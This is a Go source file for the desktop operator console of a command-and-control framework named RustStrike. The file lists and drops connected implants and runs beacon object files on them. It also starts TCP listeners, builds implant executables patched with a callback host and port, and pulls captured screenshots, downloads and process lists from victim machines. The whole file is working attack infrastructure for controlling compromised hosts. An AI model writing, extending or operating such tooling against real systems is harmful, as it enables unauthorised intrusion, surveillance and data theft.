package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/wailsapp/wails/v2/pkg/runtime"
)

// App is the Wails-bound bridge between the Vue frontend and the Go service
// core (clients/go-server). All implant/BOF actions go through the core's REST
// API; the core's WebSocket event stream is forwarded to the frontend as Wails
// events ("core:event").
type App struct {
	ctx     context.Context
	coreURL string // e.g. http://127.0.0.1:8091
}

func NewApp() *App { return &App{} }

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	// Core address is configurable via env (RUSTSTRIKE_CORE).
	a.coreURL = strings.TrimRight(coreBaseURL(), "/")
	// Kick off the WebSocket listener that forwards core events to the UI.
	go a.forwardEvents()
}

// ---- types returned to the frontend ----

type Implant struct {
	ID    uint64 `json:"id"`
	Addr  string `json:"addr"`
	Since string `json:"since"`
}

type BofEntry struct {
	Name string `json:"name"`
	Size int64  `json:"size"`
}

// TaskResult is the polled result of a BOF execution. Status is "running"
// (output not yet arrived), "completed", or "failed".
type TaskResult struct {
	ID     string `json:"id"`
	Status string `json:"status"`
	Output string `json:"output"`
}

type CoreEvent struct {
	Type      string `json:"type"`
	ImplantID uint64 `json:"implant_id"`
	Data      string `json:"data"`
}

// ---- REST wrappers (frontend calls these via the generated bindings) ----

// ListImplants returns all currently-connected implant sessions.
func (a *App) ListImplants() ([]Implant, error) {
	var out []Implant
	if err := a.get("/api/implants", &out); err != nil {
		return nil, err
	}
	return out, nil
}

// Hello sends a link-check to an implant.
func (a *App) Hello(id uint64) error {
	return a.post(fmt.Sprintf("/api/implants/%d/hello", id), nil, nil)
}

// RunBofByName runs a library BOF on an implant and returns the task id the
// GUI polls for output. argsB64 is a base64 raw arg buffer (may be "").
func (a *App) RunBofByName(id uint64, bofName string, argsB64 string) (string, error) {
	body := map[string]string{"bof": bofName, "args": argsB64}
	var resp struct {
		TaskID string `json:"task_id"`
	}
	if err := a.post(fmt.Sprintf("/api/bofs/%s/run?implant=%d", bofName, id), body, &resp); err != nil {
		return "", err
	}
	return resp.TaskID, nil
}

// RunBofByB64 runs a raw base64 COFF on an implant and returns the task id.
func (a *App) RunBofByB64(id uint64, cofB64 string, argsB64 string) (string, error) {
	body := map[string]string{"bof": cofB64, "args": argsB64}
	var resp struct {
		TaskID string `json:"task_id"`
	}
	if err := a.post(fmt.Sprintf("/api/implants/%d/bof", id), body, &resp); err != nil {
		return "", err
	}
	return resp.TaskID, nil
}

// GetTaskResult polls a BOF task. Returns status "running" until the implant's
// output/error arrives, then "completed"/"failed" with the output text.
func (a *App) GetTaskResult(taskID string) (TaskResult, error) {
	var out TaskResult
	if err := a.get("/api/tasks/"+taskID, &out); err != nil {
		return TaskResult{}, err
	}
	return out, nil
}

// DropImplant closes an implant session.
func (a *App) DropImplant(id uint64) error {
	return a.del(fmt.Sprintf("/api/implants/%d", id), nil)
}

// ListBofs returns the BOF library.
func (a *App) ListBofs() ([]BofEntry, error) {
	var out []BofEntry
	if err := a.get("/api/bofs", &out); err != nil {
		return nil, err
	}
	return out, nil
}

// UploadBof stores a base64 COFF into the library under `name`.
func (a *App) UploadBof(name string, cofB64 string) error {
	body := map[string]string{"name": name, "file_b64": cofB64}
	return a.post("/api/bofs", body, nil)
}

// ---- Listeners (runtime start/stop of TCP implant listeners) ----

// ListenerEntry is one managed listener.
type ListenerEntry struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Protocol  string `json:"protocol"`
	BindIP    string `json:"bind_ip"`
	Port      string `json:"port"`
	Active    bool   `json:"active"`
	CreatedTS int64  `json:"created_ts"`
}

func (a *App) ListListeners() ([]ListenerEntry, error) {
	var out []ListenerEntry
	if err := a.get("/api/listeners", &out); err != nil {
		return nil, err
	}
	return out, nil
}

func (a *App) CreateListener(name, bindIP, port string) (ListenerEntry, error) {
	body := map[string]string{"name": name, "bind_ip": bindIP, "port": port, "protocol": "tcp"}
	var resp struct {
		ID string `json:"id"`
	}
	if err := a.post("/api/listeners", body, &resp); err != nil {
		return ListenerEntry{}, err
	}
	return ListenerEntry{ID: resp.ID, Name: name, BindIP: bindIP, Port: port, Active: true}, nil
}

func (a *App) UpdateListener(id, name, bindIP, port string) error {
	body := map[string]string{"name": name, "bind_ip": bindIP, "port": port}
	return a.put(fmt.Sprintf("/api/listeners/%s", id), body, nil)
}

func (a *App) ToggleListener(id string, start bool) error {
	action := "stop"
	if start {
		action = "start"
	}
	return a.post(fmt.Sprintf("/api/listeners/%s/%s", id, action), nil, nil)
}

func (a *App) DeleteListener(id string) error {
	return a.del(fmt.Sprintf("/api/listeners/%s", id), nil)
}

// ---- Stub builder ----

// BuildStub patches a base implant exe with a host:port trailer and returns
// the patched bytes as base64 (the frontend triggers a blob download).
func (a *App) BuildStub(host, port string) (string, error) {
	body := map[string]string{"host": host, "port": port}
	var resp struct {
		ExeB64 string `json:"exe_b64"`
	}
	if err := a.post("/api/stub/build", body, &resp); err != nil {
		return "", err
	}
	return resp.ExeB64, nil
}

// BuildStubToProject patches a base implant exe via the core (/api/stub/build,
// which only returns base64 — no project-local copy), then pops the OS
// "Save As" dialog so the operator chooses where to save the agent exe.
// Returns the chosen absolute path (JSON string {"path":""}) — path is empty
// if the operator cancelled. name suggests a default filename in the dialog.
func (a *App) BuildStubToProject(host, port, name string) (string, error) {
	body := map[string]string{"host": host, "port": port}
	var resp struct {
		ExeB64 string `json:"exe_b64"`
	}
	if err := a.post("/api/stub/build", body, &resp); err != nil {
		return "", err
	}
	if resp.ExeB64 == "" {
		return "", fmt.Errorf("no exe in core response")
	}
	// OS Save As dialog. Default to <name>.exe (or ruststrike-implant.exe).
	defName := strings.TrimSpace(name)
	if defName == "" {
		defName = "ruststrike-implant"
	}
	if !strings.HasSuffix(strings.ToLower(defName), ".exe") {
		defName += ".exe"
	}
	path, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: defName,
		Title:           "Save generated agent exe",
		Filters: []runtime.FileFilter{
			{DisplayName: "Executable (*.exe)", Pattern: "*.exe"},
		},
	})
	if err != nil {
		return "", fmt.Errorf("save dialog: %w", err)
	}
	// Empty path = operator cancelled. Return empty (no error) so the GUI
	// can treat it as a no-op rather than a failure.
	if path == "" {
		out, _ := json.Marshal(map[string]string{"path": ""})
		return string(out), nil
	}
	// Decode base64 -> bytes -> write to the chosen path.
	raw, err := base64.StdEncoding.DecodeString(resp.ExeB64)
	if err != nil {
		return "", fmt.Errorf("decode exe: %w", err)
	}
	if err := os.WriteFile(path, raw, 0o644); err != nil {
		return "", fmt.Errorf("write exe: %w", err)
	}
	out, _ := json.Marshal(map[string]string{"path": path})
	return string(out), nil
}

// ---- Logs (persisted in SQLite) ----

// LogEntry is one persisted log row.
type LogEntry struct {
	ID        int64  `json:"id"`
	TS        int64  `json:"ts"`
	ImplantID uint64 `json:"implant_id"`
	Type      string `json:"type"`
	Data      string `json:"data"`
}

func (a *App) GetLogs(limit int, implantID uint64) ([]LogEntry, error) {
	q := fmt.Sprintf("/api/logs?limit=%d", limit)
	if implantID > 0 {
		q += fmt.Sprintf("&implant=%d", implantID)
	}
	var out []LogEntry
	if err := a.get(q, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// ---- Agents + artifacts (persistent agent console) ----

// AgentEntry is one agent (live or historical).
type AgentEntry struct {
	ImplantID uint64 `json:"implant_id"`
	FirstSeen int64  `json:"first_seen"`
	LastSeen  int64  `json:"last_seen"`
	Addr      string `json:"addr"`
	Note      string `json:"note"`
	Online    bool   `json:"online"`
}

// ArtifactEntry is one captured BOF output (file_list/proc_list/screenshot/download).
type ArtifactEntry struct {
	ID        int64  `json:"id"`
	TS        int64  `json:"ts"`
	ImplantID uint64 `json:"implant_id"`
	Kind      string `json:"kind"`
	Path      string `json:"path,omitempty"`
	Meta      string `json:"meta,omitempty"`
	HasBlob   bool   `json:"has_blob"`
}

func (a *App) ListAgents() ([]AgentEntry, error) {
	var out []AgentEntry
	if err := a.get("/api/agents", &out); err != nil {
		return nil, err
	}
	return out, nil
}

func (a *App) ListArtifacts(implantID uint64, kind string, limit int) ([]ArtifactEntry, error) {
	q := fmt.Sprintf("/api/agents/%d/artifacts?limit=%d", implantID, limit)
	if kind != "" {
		q += "&kind=" + kind
	}
	var out []ArtifactEntry
	if err := a.get(q, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// GetArtifact returns one artifact. For blob kinds (screenshot/download) it's
// the base64 bytes; for text kinds it's the meta.
func (a *App) GetArtifact(implantID, aid uint64) (string, string, string, error) {
	var out struct {
		ID   string `json:"id"`
		Kind string `json:"kind"`
		B64  string `json:"b64"`
		Meta string `json:"meta"`
	}
	if err := a.get(fmt.Sprintf("/api/agents/%d/artifacts/%d", implantID, aid), &out); err != nil {
		return "", "", "", err
	}
	return out.Kind, out.B64, out.Meta, nil
}

// ---- HTTP helpers ----

func (a *App) get(path string, out interface{}) error {
	resp, err := a.client().Get(a.coreURL + path)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) post(path string, body interface{}, out interface{}) error {
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, _ := http.NewRequest("POST", a.coreURL+path, rd)
	req.Header.Set("Content-Type", "application/json")
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) put(path string, body interface{}, out interface{}) error {
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, _ := http.NewRequest("PUT", a.coreURL+path, rd)
	req.Header.Set("Content-Type", "application/json")
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) del(path string, out interface{}) error {
	req, _ := http.NewRequest("DELETE", a.coreURL+path, nil)
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) client() *http.Client {
	return &http.Client{Timeout: 10 * time.Second}
}

func decode(resp *http.Response, out interface{}) error {
	if resp.StatusCode >= 400 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("core %s: %s", resp.Status, string(b))
	}
	if out == nil {
		return nil
	}
	return json.NewDecoder(resp.Body).Decode(out)
}

// keep the runtime import used (forwardEvents emits via runtime.EventsEmit).
var _ = runtime.EventsEmit
